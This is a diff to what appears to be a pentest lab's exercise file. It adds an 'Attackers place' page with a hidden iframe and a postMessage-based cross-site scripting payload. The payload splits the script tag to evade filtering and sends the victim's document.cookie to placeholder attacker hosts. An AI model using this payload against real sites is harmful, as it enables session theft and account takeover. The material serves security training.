@@ -16,12 +16,20 @@
   - |
     <h1>Attackers place</h1>
     Thank you for your cooperation!
+    <iframe onload='attack()' style='border: none;width:0; height:0' src='http://clonecloud.example.org/view.cgi'></iframe>
+    <script>
+      var payload = 'document.write("<img src=\'http://myhomepage.#PENTESTLAB-DOMAIN#/attacker?cookie="+document.cookie+"\' />")';
+      function attack(){
+        $("iframe")[0].contentWindow.postMessage("'/><scri"+"pt>"+payload+"</scri"+"pt><div id='comment","*");
+      };
+    </script>
+  - |
+    <h1>Attackers place</h1>
+    Thank you for your cooperation!
     <iframe onload='attack()' style='border: none;width:0; height:0' src='http://clonecloud.#PENTESTLAB-DOMAIN#/view.cgi'></iframe>
     <script>
-      var script      = String.fromCharCode(60,     115, 99, 114, 105, 112, 116, 62);
-      var scriptclose = String.fromCharCode(60, 47, 115, 99, 114, 105, 112, 116, 62);
       var payload = 'document.write("<img src=\'http://#ATTACKER-IP#:1337/"+document.cookie+"\' />")';
       function attack(){
-        $("iframe")[0].contentWindow.postMessage("'/>"+script+payload+scriptclose+"<div id='comment","*");
+        $("iframe")[0].contentWindow.postMessage("'/><scri"+"pt>"+payload+"</scri"+"pt><div id='comment","*");
       };
     </script>
